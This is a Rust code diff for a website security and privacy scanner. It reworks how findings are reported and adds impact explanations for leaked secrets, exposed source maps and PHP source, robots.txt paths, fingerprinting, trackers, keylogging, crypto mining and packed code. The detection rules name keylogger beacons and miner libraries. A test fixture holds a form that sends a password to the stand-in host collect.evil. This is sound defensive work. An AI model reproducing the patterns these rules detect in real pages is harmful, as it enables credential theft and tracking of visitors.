+        let says = if issues.is_empty() { FORM } else { FORM_ISSUES };
+        let start = offset(html, tag);
+        let mut form = at.signal(
+            "Forms",
+            format!("Form: {method} {dest}"),
+            severity,
+            says,
+            snippet(tag),
+            (start, start + tag.len()),
+        );
+        form.issues = issues;
+        out.push(form);
     }
+    out
 }
 
 /// Credentials in `code`, masked.
-fn secret_signals(code: &str, page: &str, script: Option<&str>, out: &mut Vec<Signal>) {
-    for s in code::secrets(code) {
-        out.push(own(
-            "Secrets",
-            s.label,
-            s.severity,
-            s.why,
-            code::evidence(code, &s),
-            page,
-            script,
-        ));
-    }
+fn secret_signals(code: &str, at: Loc) -> Vec<Signal> {
+    code::secrets(code)
+        .into_iter()
+        .map(|s| {
+            at.signal(
+                "Secrets",
+                s.label,
+                s.severity,
+                Says {
+                    why: s.why,
+                    impact: s.impact,
+                },
+                code::evidence(code, &s),
+                (s.at, s.at + s.len),
+            )
+        })
+        .collect()
 }
 
 /// Whether a host is a developer's machine or on a private network.
@@ -880,61 +1217,71 @@ const ADMIN: &[&str] = &[
     "superuser",
 ];
 
+const CALLS_ADMIN: Says = Says {
+    why: "The code names an endpoint meant for administrators, so anyone reading it learns it's there.",
+    impact: "Attackers read bundles for exactly these paths, then call them directly. If the server only hides the button and doesn't check who's calling, they get the admin action.",
+};
+const CLEAR_REQUEST: Says = Says {
+    why: "The page is encrypted, but its code sends requests unencrypted.",
+    impact: "What these requests carry, and the answers the page acts on, can be read or changed by anyone on the network path, a café's Wi-Fi included.",
+};
+const DEV_ADDRESS: Says = Says {
+    why: "An address on a developer's machine or a private network was left in the code.",
+    impact: "Whatever uses it breaks for visitors, and it hands attackers internal host names and ports to aim at.",
+};
+
 /// What's worth flagging about one request the site's code makes.
-fn request_signals(
-    site: &mut Site,
-    root: &Url,
-    call: &code::Call,
-    page: &str,
-    script: Option<&str>,
-) {
-    let Ok(to) = root.join(&call.url) else { return };
+fn request_signals(root: &Url, call: &code::Call, at: Loc) -> Vec<Signal> {
+    let mut out = Vec::new();
+    let Ok(to) = root.join(&call.url) else {
+        return out;
+    };
     let evidence = format!("{} {}", call.method, call.url);
+    let span = (call.at, call.at + call.url.len());
     let admin = to
         .path()
         .to_ascii_lowercase()
         .split(|c: char| !c.is_ascii_alphanumeric())
         .any(|w| ADMIN.contains(&w));
     if admin && same_site(root, &to) {
-        site.signals.push(own(
+        out.push(at.signal(
             "Requests",
-            "Calls an admin endpoint",
+            format!("Calls an admin endpoint: {}", call.url),
             "low",
-            "The code names an endpoint meant for administrators, so anyone reading it learns it's there. Make sure the server checks who's calling, not just that the button is hidden.",
+            CALLS_ADMIN,
             evidence.clone(),
-            page,
-            script,
+            span,
         ));
     }
     let clear = matches!(to.scheme(), "http" | "ws");
     if clear && root.scheme() == "https" && !to.host_str().is_some_and(dev_host) {
-        site.signals.push(own(
+        out.push(at.signal(
             "Requests",
             "Sends requests over plain HTTP",
             "medium",
-            "The page is encrypted, but its code sends requests unencrypted, where anything in them can be read or changed on the way.",
+            CLEAR_REQUEST,
             evidence,
-            page,
-            script,
+            span,
         ));
     }
+    out
 }
 
 /// Reads code the site serves as its own (inline, its scripts, the original
 /// source in its source maps): credentials, the requests it makes,
 /// development addresses left in it, and file uploads it builds.
-fn own_code(site: &mut Site, root: &Url, code: &str, page: &str, script: Option<&str>) {
-    secret_signals(code, page, script, &mut site.signals);
+fn own_code(requests: &mut Vec<Request>, root: &Url, code: &str, at: Loc) -> Vec<Signal> {
+    let mut out = secret_signals(code, at);
     for call in code::requests(code) {
-        request_signals(site, root, &call, page, script);
+        out.extend(request_signals(root, &call, at));
         add_request(
-            site,
+            requests,
             Request {
                 method: call.method,
                 url: call.url,
                 params: Vec::new(),
-                page: page.to_string(),
-                script: script.map(str::to_string),
+                page: at.page.to_string(),
+                script: at.script.map(str::to_string),
             },
         );
     }
@@ -945,14 +1292,14 @@ fn own_code(site: &mut Site, root: &Url, code: &str, page: &str, script: Option<
                 .is_some_and(|u| u.host_str().is_some_and(dev_host))
         });
         if let Some(a) = dev {
-            site.signals.push(own(
+            let start = offset(code, a);
+            out.push(at.signal(
                 "Requests",
                 "Names a development address",
                 "low",
-                "An address on a developer's machine or a private network was left in the code. It won't work for visitors, and it tells anyone reading the code about the network behind the site.",
+                DEV_ADDRESS,
                 a.to_string(),
-                page,
-                script,
+                (start, start + a.len()),
             ));
         }
     }
@@ -963,83 +1310,76 @@ fn own_code(site: &mut Site, root: &Url, code: &str, page: &str, script: Option<
         "type: \"file\"",
         "type:'file'",
     ];
-    if let Some(at) = upload.iter().find_map(|p| code.find(p)) {
-        site.signals.push(own(
+    if let Some((i, len)) = upload
+        .iter()
+        .find_map(|p| code.find(p).map(|i| (i, p.len())))
+    {
+        out.push(at.signal(
             "Forms",
             "Takes file uploads",
             "low",
             UPLOAD,
-            around(code, at),
-            page,
-            script,
+            around(code, i),
+            (i, i + len),
         ));
     }
+    out
 }
 
-const SOURCE: &str = "Its source maps hold the original, unminified source of the site's code, comments and all, for anyone to download. Leave them out of what's deployed.";
+const SOURCE: Says = Says {
+    why: "Its source maps hold the original, unminified source of the site's code, comments and all, for anyone to download. Leave them out of what's deployed.",
+    impact: "The full original code, with its comments, internal paths and anything left in it, is readable, which makes finding the next weakness much easier.",
+};
+const SOURCE_MAP: Says = Says {
+    why: "Its source maps name every original source file and where its code came from.",
+    impact:
+        "A map of how the site is built, file by file, which helps an attacker find where to look.",
+};
 
-/// The source map one of the site's scripts names, on the site; an inline
-/// one is flagged here instead.
-fn source_map(
-    root: &Url,
-    script: &str,
-    code: &str,
-    page: &str,
-    out: &mut Vec<Signal>,
-) -> Option<Url> {
-    let at = code.rfind("sourceMappingURL=")? + 17;
-    let name = code[at..]
+/// The source map a script names: where it does, and the name.
+fn source_map(code: &str) -> Option<((usize, usize), &str)> {
+    let key = "sourceMappingURL=";
+    let at = code.rfind(key)?;
+    let rest = &code[at + key.len()..];
+    let name = rest
         .split(|c: char| c.is_whitespace() || "*\"'".contains(c))
         .next()
         .filter(|n| !n.is_empty())?;
-    if name.starts_with("data:") {
-        out.push(own(
-            "Source",
-            "Ships its source code",
-            "medium",
-            SOURCE,
-            format!(
-                "sourceMappingURL={}...",
-                name.chars().take(40).collect::<String>()
-            ),
-            page,
-            Some(script),
-        ));
-        return None;
-    }
-    let url = Url::parse(script).ok()?.join(name).ok()?;
-    same_origin(root, &url).then_some(url)
+    Some(((at, at + key.len() + name.len()), name))
 }
 
-/// Reads each source map: flags it, and reads the site's own original
-/// source in it as its own code.
-async fn read_maps(client: &Client, root: &Url, site: &mut Site, maps: &[(Url, String, String)]) {
-    let bodies = join_all(maps.iter().map(|(m, _, _)| body(client, m.as_str()))).await;
-    for ((map, script, page), text) in maps.iter().zip(bodies) {
+/// A source's name in a map, cleaned to a path: `webpack://app/./src/a.js`
+/// is `src/a.js`.
+fn clean_source(name: &str) -> String {
+    let name = name.split_once("://").map_or(name, |(_, rest)| rest);
+    let parts: Vec<&str> = name
+        .split('/')
+        .filter(|p| !p.is_empty() && *p != "." && *p != "..")
+        .collect();
+    let skip = usize::from(parts.len() > 1 && !parts[0].contains('.') && name.contains("/./"));
+    parts[skip..].join("/")
+}
+
+/// Reads each source map: flags it in the script that names it, and reads
+/// the site's own original source in it as its own code.
+async fn read_maps(client: &Client, root: &Url, site: &mut Site, maps: &[MapRef]) {
+    let bodies = join_all(maps.iter().map(|m| body(client, m.map.as_str()))).await;
+    for (m, text) in maps.iter().zip(bodies) {
         let Some(text) = text.filter(|t| t.contains("\"mappings\"")) else {
             continue;
         };
-        if !text.contains("\"sourcesContent\"") {
-            site.signals.push(own(
-                "Source",
-                "Ships its source maps",
-                "low",
-                "Its source maps name every original source file and where its code came from, a map of how the site is built.",
-                map.to_string(),
-                page,
-                Some(script),
-            ));
+        let at = Loc::new(&m.page, Some(&m.script), &m.script);
+        let whole = text.contains("\"sourcesContent\"");
+        let (label, severity, says) = if whole {
+            ("Ships its source code", "medium", SOURCE)
+        } else {
+            ("Ships its source maps", "low", SOURCE_MAP)
+        };
+        site.signals
+            .push(at.signal("Source", label, severity, says, m.map.to_string(), m.span));
+        if !whole {
             continue;
         }
-        site.signals.push(own(
-            "Source",
-            "Ships its source code",
-            "medium",
-            SOURCE,
-            map.to_string(),
-            page,
-            Some(script),
-        ));
         let parsed: Option<serde_json::Value> = serde_json::from_str(&text).ok();
         let files = parsed.as_ref().and_then(|v| {
             Some((
@@ -1048,8 +1388,6 @@ async fn read_maps(client: &Client, root: &Url, site: &mut Site, maps: &[(Url, S
             ))
         });
         let Some((names, contents)) = files else {
-            // Cut short or malformed: read it as it is.
-            secret_signals(&text, page, Some(map.as_str()), &mut site.signals);
             continue;
         };
         for (name, content) in names.iter().zip(contents) {
@@ -1059,7 +1397,16 @@ async fn read_maps(client: &Client, root: &Url, site: &mut Site, maps: &[(Url, S
             if name.contains("node_modules") || name.starts_with("webpack/") {
                 continue;
             }
-            own_code(site, root, content, page, Some(&format!("{map} ({name})")));
+            let key = format!("{} ({name})", m.map);
+            let shown = format!("source maps/{}", clean_source(name));
+            let kind = kind_of(&shown, "js");
+            let found = own_code(
+                &mut site.requests,
+                root,
+                content,
+                Loc::new(&m.page, Some(&key), &key),
+            );
+            add(site, found, &key, shown, kind, content);
         }
     }
 }
@@ -1110,18 +1457,32 @@ const HIDDEN: &[&str] = &[
     "logs",
 ];
 
+const ROBOTS_OPEN: Says = Says {
+    why: "robots.txt is public, and this path it asks search engines to skip opens without a login.",
+    impact: "robots.txt is the first file an attacker reads. This path is listed there and opens to anyone, so whatever it holds is theirs.",
+};
+const ROBOTS_LOGIN: Says = Says {
+    why: "robots.txt is public, so listing this path there tells anyone where it is. It asks for a login.",
+    impact: "It points automated password guessing straight at the login. Make sure it's strong, limits attempts and has two-factor sign-in.",
+};
+
 /// What the paths `robots.txt` names give away: a sensitive-sounding path
 /// that opens to anyone, or one that only tells where a login is.
 async fn robots_signals(
     client: &Client,
     root: &Url,
     site: &mut Site,
-    robots: &[(String, String)],
+    robots: &Robots,
     soft404: Option<&Baseline>,
 ) {
+    let Ok(url) = root.join("/robots.txt").map(|u| u.to_string()) else {
+        return;
+    };
+    let at = Loc::new("/robots.txt", None, &url);
     let blanket = matches!(soft404, Some(Baseline::Redirect { .. }));
     let mut checked = 0;
-    for (path, line) in robots {
+    let mut found = Vec::new();
+    for (path, line) in &robots.named {
         let hidden = path
             .to_ascii_lowercase()
             .split(|c: char| !c.is_ascii_alphanumeric())
@@ -1135,6 +1496,10 @@ async fn robots_signals(
         else {
             continue;
         };
+        let span = robots
+            .text
+            .find(line.as_str())
+            .map_or((0, 0), |i| (i, i + line.len()));
         if (200..300).contains(&status) {
             // On a service that answers every path alike, it isn't there.
             if let Some(base) = soft404.filter(|b| matches!(b, Baseline::Page { .. })) {
@@ -1152,27 +1517,33 @@ async fn robots_signals(
                     _ => continue,
                 }
             }
-            site.signals.push(own(
+            found.push(at.signal(
                 "Robots",
                 format!("robots.txt points to {path}, open to anyone"),
                 "medium",
-                "robots.txt is public, and this path it asks search engines to skip opens without a login, so anyone who reads the file can open it too.",
+                ROBOTS_OPEN,
                 line.clone(),
-                path,
-                None,
+                span,
             ));
         } else if status == 401 || status == 403 || ((300..400).contains(&status) && !blanket) {
-            site.signals.push(own(
+            found.push(at.signal(
                 "Robots",
                 format!("robots.txt names {path}"),
                 "low",
-                "robots.txt is public, so listing this path there tells anyone where it is. It asks for a login: make sure that login is strong and limits attempts.",
+                ROBOTS_LOGIN,
                 line.clone(),
-                path,
-                None,
+                span,
             ));
         }
     }
+    add(
+        site,
+        found,
+        &url,
+        "/robots.txt".to_string(),
+        "text",
+        &robots.text,
+    );
 }
 
 /// Copies an editor or a deploy leaves next to a PHP file.
@@ -1186,6 +1557,11 @@ const WP_CONFIG: &[&str] = &[
     "/wp-config.php.save",
     "/wp-config.txt",
 ];
+
+const PHP_SOURCE: Says = Says {
+    why: "The server hands out this PHP file's source instead of running it. Delete stray copies and make sure PHP runs for every .php file.",
+    impact: "Database passwords, API keys and how the page works are readable by anyone, who can sign in to the database with them or read the code for a way in.",
+};
 
 /// PHP the server hands out as source instead of running it: a `.php`
 /// page served as text, the copies editors and deploys leave beside PHP
@@ -1225,22 +1601,22 @@ async fn php_source(client: &Client, root: &Url, site: &mut Site) {
         .await;
         for (path, text) in chunk.iter().zip(bodies) {
             let Some(text) = text else { continue };
-            let Some(at) = text.find("<?php") else {
+            let Some(start) = text.find("<?php") else {
                 continue;
             };
             let url = root
                 .join(path)
                 .map_or_else(|_| path.clone(), |u| u.to_string());
-            site.signals.push(own(
+            let at = Loc::new(path, Some(&url), &url);
+            let mut found = vec![at.signal(
                 "Source",
                 "Serves PHP source",
                 "high",
-                "The server hands out this PHP file's source instead of running it: its logic, file paths and any passwords in it are readable by anyone. Delete stray copies and make sure PHP runs for every .php file.",
-                around(&text, at),
-                path,
-                None,
-            ));
-            secret_signals(&text, path, Some(&url), &mut site.signals);
+                PHP_SOURCE,
+                around(&text, start),
+                (start, start + 5),
+            )];
+            found.extend(secret_signals(&text, at));
             let inputs = code::php_inputs(&text);
             for method in ["GET", "POST", "ANY", "COOKIE", "FILE"] {
                 let params: Vec<String> = inputs
@@ -1252,18 +1628,18 @@ async fn php_source(client: &Client, root: &Url, site: &mut Site) {
                     continue;
                 }
                 if method == "FILE" {
-                    site.signals.push(own(
+                    let i = text.find("$_FILES").unwrap_or(start);
+                    found.push(at.signal(
                         "Forms",
                         "Takes file uploads",
                         "low",
                         UPLOAD,
                         format!("$_FILES['{}']", params[0]),
-                        path,
-                        Some(&url),
+                        (i, i + 7),
                     ));
                 }
                 add_request(
-                    site,
+                    &mut site.requests,
                     Request {
                         method: method.to_string(),
                         url: path.clone(),
@@ -1273,6 +1649,7 @@ async fn php_source(client: &Client, root: &Url, site: &mut Site) {
                     },
                 );
             }
+            add(site, found, &url, path.clone(), "php", &text);
         }
     }
 }
@@ -1283,8 +1660,10 @@ struct Rule {
     label: &'static str,
     severity: &'static str,
     all: &'static [&'static [&'static str]],
-    why: &'static str,
+    says: Says,
 }
+
+const FINGERPRINT: &str = "Combined with a few other details, it gives the visitor an ID that follows them across visits, cleared cookies and private windows included.";
 
 const RULES: &[Rule] = &[
     Rule {
@@ -1292,91 +1671,130 @@ const RULES: &[Rule] = &[
         label: "Asks for your location",
         severity: "medium",
         all: &[&["getCurrentPosition", "watchPosition"]],
-        why: "Your browser would ask to share your precise location with the site.",
+        says: Says {
+            why: "Your browser would ask to share your precise location with the site.",
+            impact: "A visitor who allows it tells the site where they are to within metres, and every other script on the page, ads or a compromised library, can read it too.",
+        },
     },
     Rule {
         category: "Location",
         label: "Looks up where your IP address is",
         severity: "medium",
         all: &[&["ipapi.co", "ipinfo.io", "ip-api.com", "ipgeolocation", "freegeoip", "geoip-db", "api.ipify.org", "extreme-ip-lookup", "geolocation-db"]],
-        why: "The page asks a third party for your public IP address or the place it's registered to.",
+        says: Says {
+            why: "The page asks a third party for your public IP address or the place it's registered to.",
+            impact: "Each visitor's IP address and rough location go to another company, which can tie them to their visits on every other site that uses it.",
+        },
     },
     Rule {
         category: "Network",
         label: "Can reveal your local IP address",
         severity: "medium",
         all: &[&["RTCPeerConnection", "webkitRTCPeerConnection"], &["onicecandidate", "createDataChannel"]],
-        why: "WebRTC used this way can expose your device's address on its local network, even behind a VPN.",
+        says: Says {
+            why: "WebRTC used this way can expose your device's address on its local network, even behind a VPN.",
+            impact: "A visitor's private address leaks, which helps unmask them behind a VPN and maps the network they're on.",
+        },
     },
     Rule {
         category: "Fingerprinting",
         label: "Uses a fingerprinting library",
         severity: "medium",
         all: &[&["fingerprintjs", "FingerprintJS", "fpjs.io", "ClientJS", "evercookie", "fingerprint2", "Fingerprint2"]],
-        why: "A library built to identify your browser across visits without cookies.",
+        says: Says {
+            why: "A library built to identify your browser across visits without cookies.",
+            impact: FINGERPRINT,
+        },
     },
     Rule {
         category: "Fingerprinting",
         label: "Draws a hidden canvas to fingerprint your browser",
         severity: "low",
         all: &[&["toDataURL", "getImageData"], &["fillText"]],
-        why: "Text drawn on an unseen canvas renders slightly differently on every machine, which identifies yours.",
+        says: Says {
+            why: "Text drawn on an unseen canvas renders slightly differently on every machine, which identifies yours.",
+            impact: FINGERPRINT,
+        },
     },
     Rule {
         category: "Fingerprinting",
         label: "Reads your graphics card",
         severity: "low",
         all: &[&["UNMASKED_RENDERER_WEBGL", "UNMASKED_VENDOR_WEBGL", "WEBGL_debug_renderer_info"]],
-        why: "The exact graphics hardware is one of the strongest fingerprinting signals.",
+        says: Says {
+            why: "The exact graphics hardware is one of the strongest fingerprinting signals.",
+            impact: FINGERPRINT,
+        },
     },
     Rule {
         category: "Fingerprinting",
         label: "Fingerprints your audio stack",
         severity: "low",
         all: &[&["createOscillator"], &["createDynamicsCompressor", "OfflineAudioContext"]],
-        why: "A silent sound processed by your browser comes out slightly differently on every machine.",
+        says: Says {
+            why: "A silent sound processed by your browser comes out slightly differently on every machine.",
+            impact: FINGERPRINT,
+        },
     },
     Rule {
         category: "Fingerprinting",
         label: "Reads your battery",
         severity: "low",
         all: &[&["getBattery("]],
-        why: "Battery level and charging state can tie your visits together.",
+        says: Says {
+            why: "Battery level and charging state can tie your visits together.",
+            impact: "Two visits a minute apart, even in different private windows, can be matched by their battery level.",
+        },
     },
     Rule {
         category: "Fingerprinting",
         label: "Collects details about your device",
         severity: "low",
         all: &[&["hardwareConcurrency"], &["deviceMemory", "navigator.plugins", "getHighEntropyValues", "colorDepth"]],
-        why: "Processor count, memory, plugins and screen details together narrow down who you are.",
+        says: Says {
+            why: "Processor count, memory, plugins and screen details together narrow down who you are.",
+            impact: FINGERPRINT,
+        },
     },
     Rule {
         category: "Camera and sensors",
         label: "Asks for your camera or microphone",
         severity: "medium",
         all: &[&["getUserMedia("]],
-        why: "Your browser would ask to turn on your camera or microphone for the site.",
+        says: Says {
+            why: "Your browser would ask to turn on your camera or microphone for the site.",
+            impact: "Once allowed, the page can record sound or video, and so can any compromised script running on it.",
+        },
     },
     Rule {
         category: "Camera and sensors",
         label: "Lists your cameras and microphones",
         severity: "low",
         all: &[&["enumerateDevices("]],
-        why: "The devices attached to your machine help identify it.",
+        says: Says {
+            why: "The devices attached to your machine help identify it.",
+            impact: FINGERPRINT,
+        },
     },
     Rule {
         category: "Camera and sensors",
         label: "Reads motion sensors",
         severity: "low",
         all: &[&["DeviceMotionEvent", "DeviceOrientationEvent", "devicemotion", "deviceorientation"]],
-        why: "On phones, motion sensors can reveal how you hold the device and even what you tap.",
+        says: Says {
+            why: "On phones, motion sensors can reveal how you hold the device and even what you tap.",
+            impact: "Motion data has been used to work out where on the screen someone taps, PIN entry included.",
+        },
     },
     Rule {
         category: "Camera and sensors",
         label: "Reads your clipboard",
         severity: "medium",
         all: &[&["clipboard.readText", "clipboard.read("]],
-        why: "Whatever you last copied, such as a password, could be read by the page.",
+        says: Says {
+            why: "Whatever you last copied, such as a password, could be read by the page.",
+            impact: "A password or one-time code copied from a password manager can be read and sent away.",
+        },
     },
     Rule {
         category: "Typing",
@@ -1386,64 +1804,82 @@ const RULES: &[Rule] = &[
             &["\"keydown\"", "'keydown'", "\"keypress\"", "'keypress'", "\"keyup\"", "'keyup'", "onkeypress", "onkeydown"],
             &["sendBeacon", "new Image().src", "new WebSocket("],
         ],
-        why: "Key presses are watched by code that can quietly send data away, before you ever submit anything.",
+        says: Says {
+            why: "Key presses are watched by code that can quietly send data away, before you ever submit anything.",
+            impact: "What a visitor types, passwords included, can leave the page before they press submit, or even if they change their mind and never do.",
+        },
     },
     Rule {
         category: "Mining",
         label: "Mines cryptocurrency in your browser",
         severity: "high",
         all: &[&["coinhive", "CoinHive", "cryptonight", "CryptoNight", "coinimp", "webminer", "minero.cc", "crypto-loot", "deepMiner", "webmine.pro"]],
-        why: "The page would use your processor to mine for someone else, slowing and heating your machine.",
+        says: Says {
+            why: "The page would use your processor to mine for someone else, slowing and heating your machine.",
+            impact: "Visitors' processors run flat out for someone else, draining batteries, and antivirus and browsers start flagging the site.",
+        },
     },
     Rule {
         category: "Hidden code",
         label: "Runs packed, hidden code",
         severity: "low",
         all: &[&["eval(atob(", "eval(function(p,a,c,k,e", "eval(unescape(", "document.write(unescape("]],
-        why: "Code wrapped so it can't be read until it runs, often to hide what it does.",
+        says: Says {
+            why: "Code wrapped so it can't be read until it runs, often to hide what it does.",
+            impact: "Hidden code can do anything a script can. It's how code planted on a compromised site usually hides.",
+        },
     },
     Rule {
         category: "Persistence",
         label: "Installs a service worker",
         severity: "low",
         all: &[&["serviceWorker.register"]],
-        why: "A service worker keeps code for the site in your browser after you leave the page.",
+        says: Says {
+            why: "A service worker keeps code for the site in your browser after you leave the page.",
+            impact: "The worker can intercept every request the site makes and keeps running cached code after the site changes, planted code included.",
+        },
     },
     Rule {
         category: "Persistence",
         label: "Asks to send you notifications",
         severity: "low",
         all: &[&["Notification.requestPermission", "pushManager.subscribe"]],
-        why: "Allowing it lets the site push messages to you whenever it likes.",
+        says: Says {
+            why: "Allowing it lets the site push messages to you whenever it likes.",
+            impact: "Notification permission is a favourite route for spam and scam pop-ups once a site is sold or compromised.",
+        },
     },
 ];
 
 /// Reads one script's code against the rules.
-fn read_code(code: &str, page: &str, script: Option<&str>, out: &mut Vec<Signal>) {
+fn read_code(code: &str, at: Loc) -> Vec<Signal> {
+    let mut out = Vec::new();
     for rule in RULES {
         let mut first = None;
-        let matched = rule
-            .all
-            .iter()
-            .all(|group| match group.iter().find_map(|n| code.find(*n)) {
-                Some(i) => {
-                    first.get_or_insert(i);
+        let matched = rule.all.iter().all(|group| {
+            match group
+                .iter()
+                .find_map(|n| code.find(*n).map(|i| (i, n.len())))
+            {
+                Some(hit) => {
+                    first.get_or_insert(hit);
                     true
                 }
                 None => false,
-            });
-        if let (true, Some(at)) = (matched, first) {
-            out.push(Signal {
-                category: rule.category,
-                label: rule.label.to_string(),
-                severity: rule.severity,
-                why: rule.why,
-                evidence: around(code, at),
-                page: page.to_string(),
-                script: script.map(str::to_string),
-            });
+            }
+        });
+        if let (true, Some((i, len))) = (matched, first) {
+            out.push(at.signal(
+                rule.category,
+                rule.label,
+                rule.severity,
+                rule.says,
+                around(code, i),
+                (i, i + len),
+            ));
         }
     }
+    out
 }
 
 /// Analytics and ad trackers, and session recorders, by where they load from.
@@ -1466,41 +1902,95 @@ const TRACKERS: &[(&str, &str, bool)] = &[
     ("crazyegg.com", "Crazy Egg", true),
 ];
 
-/// The trackers `text` (a script's URL or inline code) loads.
-fn trackers(text: &str, page: &str, script: Option<&str>, out: &mut Vec<Signal>) {
+const RECORDER: Says = Says {
+    why: "Session recorders capture your clicks, scrolling and often what you type, and replay it for the site's owners.",
+    impact: "Each visit is recorded and stored with another company, form fields included unless they're masked, so personal details typed here can end up in their storage.",
+};
+const TRACKER: Says = Says {
+    why: "An analytics or advertising tracker that follows your visit and often your browsing elsewhere.",
+    impact: "Every visit is reported to the tracker's company, which adds it to a profile of the visitor built across every site that uses it.",
+};
+
+/// The trackers `text` (a script's address or inline code) loads.
+fn trackers(text: &str, at: Loc) -> Vec<Signal> {
+    let mut out = Vec::new();
     for (host, name, replay) in TRACKERS {
-        let Some(at) = text.find(*host) else { continue };
-        out.push(if *replay {
-            Signal {
-                category: "Session recording",
-                label: format!("Records your session with {name}"),
-                severity: "medium",
-                why: "Session recorders capture your clicks, scrolling and often what you type, and replay it for the site's owners.",
-                evidence: around(text, at),
-                page: page.to_string(),
-                script: script.map(str::to_string),
-            }
+        let Some(i) = text.find(*host) else { continue };
+        let (category, label, says) = if *replay {
+            (
+                "Session recording",
+                format!("Records your session with {name}"),
+                RECORDER,
+            )
         } else {
-            Signal {
-                category: "Trackers",
-                label: format!("Tracks you with {name}"),
-                severity: "low",
-                why: "An analytics or advertising tracker that follows your visit and often your browsing elsewhere.",
-                evidence: around(text, at),
-                page: page.to_string(),
-                script: script.map(str::to_string),
-            }
-        });
+            ("Trackers", format!("Tracks you with {name}"), TRACKER)
+        };
+        out.push(at.signal(
+            category,
+            label,
+            if *replay { "medium" } else { "low" },
+            says,
+            around(text, i),
+            (i, i + host.len()),
+        ));
     }
+    out
 }
 
-/// Drops repeats of the same thing on the same page, and the notes of which
-/// page loaded which script.
+/// Drops the notes of which page loaded which script, and repeats of the
+/// same thing: the same evidence in the same script, on whichever page,
+/// as a site's layout repeats on every page.
 fn dedupe(signals: &mut Vec<Signal>) {
     let mut seen = HashSet::new();
     signals.retain(|s| {
-        s.category != "Scripts" && seen.insert((s.label.clone(), s.page.clone(), s.script.clone()))
+        s.category != "Scripts"
+            && seen.insert((s.label.clone(), s.script.clone(), s.evidence.clone()))
     });
+}
+
+/// Shows the part of each kept file its signals are in, and marks where.
+fn place(site: &mut Site) {
+    for t in std::mem::take(&mut site.texts) {
+        let mut refs = Vec::new();
+        let mut spans = Vec::new();
+        for (si, s) in site.signals.iter().enumerate() {
+            if s.file.as_deref() != Some(t.url.as_str()) {
+                continue;
+            }
+            if let Some(span) = s.span {
+                refs.push((si, None));
+                spans.push(span);
+            }
+            for (ii, issue) in s.issues.iter().enumerate() {
+                if let Some(span) = issue.span {
+                    refs.push((si, Some(ii)));
+                    spans.push(span);
+                }
+            }
+        }
+        if refs.is_empty() {
+            continue;
+        }
+        let (sections, marks) = source::show(&t.text, &spans);
+        for ((si, ii), mark) in refs.into_iter().zip(marks) {
+            match ii {
+                None => site.signals[si].mark = mark,
+                Some(ii) => site.signals[si].issues[ii].mark = mark,
+            }
+        }
+        site.files.push(SourceFile {
+            url: t.url,
+            name: t.name,
+            kind: t.kind,
+            sections,
+        });
+    }
+    let shown: HashSet<String> = site.files.iter().map(|f| f.url.clone()).collect();
+    for s in &mut site.signals {
+        if s.file.as_ref().is_some_and(|f| !shown.contains(f)) {
+            s.file = None;
+        }
+    }
 }
 
 /// About 120 characters of `text` around byte `at`, on one line.
@@ -1622,6 +2112,10 @@ fn between<'a>(text: &'a str, open: &str, close: &str) -> Vec<&'a str> {
 mod tests {
     use super::*;
 
+    fn here(file: &str) -> Loc<'_> {
+        Loc::new("/", None, file)
+    }
+
     #[test]
     fn reads_attributes() {
         assert_eq!(
@@ -1666,117 +2160,169 @@ mod tests {
 
     #[test]
     fn rules_need_every_group() {
-        let mut out = Vec::new();
-        read_code(
+        let out = read_code(
             "pc = new RTCPeerConnection(); pc.onicecandidate = f;",
-            "/",
-            None,
-            &mut out,
+            here("x"),
         );
         assert_eq!(out.len(), 1);
         assert_eq!(out[0].category, "Network");
-        let mut out = Vec::new();
-        read_code("new RTCPeerConnection()", "/", None, &mut out);
-        assert!(out.is_empty());
-        let mut out = Vec::new();
-        read_code(
+        assert_eq!(out[0].span, Some((9, 26)));
+        assert!(read_code("new RTCPeerConnection()", here("x")).is_empty());
+        let out = read_code(
             "navigator.geolocation.getCurrentPosition(ok)",
-            "/",
-            Some("https://cdn.example/a.js"),
-            &mut out,
+            Loc::new(
+                "/",
+                Some("https://cdn.example/a.js"),
+                "https://cdn.example/a.js",
+            ),
         );
         assert_eq!(out[0].label, "Asks for your location");
         assert_eq!(out[0].script.as_deref(), Some("https://cdn.example/a.js"));
+        assert!(!out[0].impact.is_empty());
+    }
+
+    fn page(root: &str, html: &str) -> Site {
+        let root = Url::parse(root).unwrap();
+        let mut site = Site::default();
+        let mut scripts = Vec::new();
+        read_page(&mut site, &root, &root, "/", html, &mut scripts);
+        dedupe(&mut site.signals);
+        place(&mut site);
+        site
     }
 
     #[test]
-    fn flags_password_forms_posting_elsewhere() {
-        let root = Url::parse("http://shop.example").unwrap();
-        let mut site = Site::default();
-        let mut scripts = Vec::new();
+    fn a_form_is_one_concern_naming_where_it_submits() {
         let html = r#"<form action="https://collect.evil/login"><input type="password"></form><iframe src="/x" style="display: none"></iframe>"#;
-        read_page(&mut site, &root, &root, "/", html, &mut scripts);
-        let labels: Vec<&str> = site.signals.iter().map(|s| s.label.as_str()).collect();
-        assert!(labels.contains(&"Loads a hidden frame"));
-        assert!(labels.contains(&"Sends a password to collect.evil"));
-        assert!(labels.contains(&"Asks for a password over plain HTTP"));
+        let site = page("http://shop.example", html);
+        let form = site.signals.iter().find(|s| s.category == "Forms").unwrap();
+        assert_eq!(form.label, "Form: GET https://collect.evil/login");
+        assert_eq!(form.severity, "high");
+        let issues: Vec<&str> = form.issues.iter().map(|i| i.label.as_str()).collect();
+        assert_eq!(
+            issues,
+            [
+                "Sends a password to collect.evil",
+                "Asks for a password over plain HTTP",
+                "Sends a password in the address"
+            ]
+        );
+        assert_eq!(
+            site.signals
+                .iter()
+                .filter(|s| s.category == "Forms")
+                .count(),
+            1
+        );
+        assert!(site
+            .signals
+            .iter()
+            .any(|s| s.label == "Loads a hidden frame"));
+        // The page is shown, and the form is marked on its opening tag.
+        let file = &site.files[0];
+        assert_eq!(file.name, "/index.html");
+        let m = form.mark.unwrap();
+        let shown: String = file.sections[m.section]
+            .text
+            .chars()
+            .skip(m.at)
+            .take(5)
+            .collect();
+        assert_eq!(shown, "<form");
+    }
+
+    #[test]
+    fn a_plain_form_still_reports_where_it_goes() {
+        let site = page(
+            "https://shop.example",
+            r#"<form action="/search"><input name="q"></form>"#,
+        );
+        assert_eq!(site.signals.len(), 1);
+        assert_eq!(site.signals[0].label, "Form: GET /search");
+        assert_eq!(site.signals[0].severity, "info");
+        assert!(site.signals[0].issues.is_empty());
+        assert_eq!(site.requests[0].params, ["q"]);
     }
 
     #[test]
     fn reads_what_forms_expose() {
-        let root = Url::parse("https://shop.example").unwrap();
-        let mut site = Site::default();
-        let mut scripts = Vec::new();
